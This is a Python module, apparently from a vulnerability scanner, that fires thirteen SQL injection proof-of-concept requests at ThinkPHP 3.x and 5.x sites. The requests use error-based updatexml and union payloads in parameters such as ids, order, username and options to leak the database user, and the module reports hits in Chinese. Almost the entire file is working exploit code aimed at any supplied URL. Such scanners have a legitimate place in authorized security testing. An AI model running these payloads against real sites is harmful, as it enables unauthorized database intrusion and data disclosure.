#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo
from pub.com.reqset import ReqSet

urllib3.disable_warnings()


class ThinkSqlScan:

    def __init__(self):
        self.proxy = None
        self.timeout = None
        self.ssl = None
        self.headers = None

    def run(self, urls):
        try:
            url = urls + '/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1'
            response = requests.get(url,headers=self.headers, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", f"{url}")
            else:
                OutPrintInfo("ThinkPHP", '不存在SQL注入')
                
        except Exception:
            OutPrintInfo("ThinkPHP", '不存在SQL注入')

    def run2(self,urls):
        try:
            url = urls + '/?id[where]=1 and updatexml(1,concat(0x7e,user(),0x7e),1) #'
            response = requests.get(url,headers=self.headers, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                OutPrintInfo("ThinkPHP", "[b bright_red]存在SQL注入")
                OutPrintInfo("ThinkPHP", url)
            else:
                OutPrintInfo("ThinkPHP", '不存在SQL注入')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在SQL注入')

    def run3(self, urls):
        try:
            url = urls + '/index/index/index?username=) union select updatexml(1,concat(0x7,user(),0x7e),1)#'
            response = requests.get(url,headers=self.headers, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                OutPrintInfo("ThinkPHP",'[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", url)
                
                   
            else:
                OutPrintInfo("ThinkPHP",'不存在SQL注入')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在SQL注入')

    def run4(self, urls):
        try:
            url = urls + '/index/index/index?username[0]=not like&username[1][0]=%%&username[1][1]=233&username[2]=) union select 1,user()#'
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "@" in response.text:
                OutPrintInfo("ThinkPHP",'[b bright_red]可能存在SQL注入(误判率较高)')
                OutPrintInfo("ThinkPHP", url)
            else:
                OutPrintInfo("ThinkPHP",'不存在SQL注入')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在SQL注入')
    def run5(self, urls):
        try:
            url = urls + '/public/index/test/index?order[id`,111)|updatexml(1,concat(0x3a,user()),1)%23][]=1'
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                OutPrintInfo("ThinkPHP",'[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", url)
                
                   
            else:
                OutPrintInfo("ThinkPHP",'不存在SQL注入')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在SQL注入')
    def run6(self, urls):
        try:
            url = urls + '/index/index/index?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&username[3]=0'
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                OutPrintInfo("ThinkPHP",'[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", url)
                
                   
            else:
                OutPrintInfo("ThinkPHP",'不存在SQL注入')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在SQL注入')
    def run7(self, urls):
        try:
            url = urls + '/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23'
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                OutPrintInfo("ThinkPHP",'[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", url)
                
                   
            else:
                OutPrintInfo("ThinkPHP",'不存在SQL注入')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在SQL注入')
    def run8(self, urls):
        try:
            url = urls + '/index/index/index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23'
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                OutPrintInfo("ThinkPHP",'[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", url)
                
                   
            else:
                OutPrintInfo("ThinkPHP",'不存在SQL注入')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在SQL注入')
    def run9(self, urls):
        try:
            url = urls + '/index/index/index?orderby[id`\|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1'
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                OutPrintInfo("ThinkPHP",'[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", url)
                
                   
            else:
                OutPrintInfo("ThinkPHP",'不存在SQL注入')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在SQL注入')
    def run10(self, urls):
        try:
            url = urls + '/index/index/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1'
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                OutPrintInfo("ThinkPHP",'[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", url)
                
                   
            else:
                OutPrintInfo("ThinkPHP",'不存在SQL注入')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在SQL注入')
    def run11(self, urls):
        try:
            url = urls + '/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23'
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                OutPrintInfo("ThinkPHP",'[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", url)
                
                   
            else:
                OutPrintInfo("ThinkPHP",'不存在SQL注入')

        except Exception:
            OutPrintInfo("ThinkPHP", '不存在SQL注入')
    def run12(self, urls):
        try:
            url = urls + '/index/index/index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23'
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                OutPrintInfo("ThinkPHP",'[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", url)
                
                   
            else:
                OutPrintInfo("ThinkPHP",'不存在SQL注入')

        except Exception:
            OutPrintInfo("ThinkPHP",'不存在SQL注入')

    def run13(self, urls):
        try:
            url = urls + '/?order[updatexml(1,concat(0x3a,user()),1)]=1'
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                # OutPrintInfo("DocCms", '[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", f"[b bright_red]存在SQL注入")
                OutPrintInfo("ThinkPHP", url)
            else:
                OutPrintInfo("ThinkPHP", '不存在SQL注入')


        except Exception:
            OutPrintInfo("ThinkPHP", '不存在SQL注入')
    def main(self, target):
        OutPrintInfo("ThinkPHP", '开始检测SQL注入...')
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy)
        OutPrintInfo("ThinkPHP", '检测3.x SQL注入')
        self.run(url)
        OutPrintInfo("ThinkPHP", '检测5.x SQL注入')
        OutPrintInfo("ThinkPHP", '开始POC-1...')
        self.run2(url)
        OutPrintInfo("ThinkPHP", '开始POC-2...')
        self.run3(url)
        OutPrintInfo("ThinkPHP", '开始POC-3...')
        self.run4(url)
        OutPrintInfo("ThinkPHP", '开始POC-4...')
        self.run5(url)
        OutPrintInfo("ThinkPHP", '开始POC-5...')
        self.run6(url)
        OutPrintInfo("ThinkPHP", '开始POC-6...')
        self.run7(url)
        OutPrintInfo("ThinkPHP", '开始POC-7...')
        self.run8(url)
        OutPrintInfo("ThinkPHP", '开始POC-8...')
        self.run9(url)
        OutPrintInfo("ThinkPHP", '开始POC-9...')
        self.run10(url)
        OutPrintInfo("ThinkPHP", '开始POC-10...')
        self.run11(url)
        OutPrintInfo("ThinkPHP", '开始POC-11...')
        self.run12(url)
        OutPrintInfo("ThinkPHP", '开始POC-12...')
        self.run13(url)

        OutPrintInfo("ThinkPHP", 'SQL注入检测结束')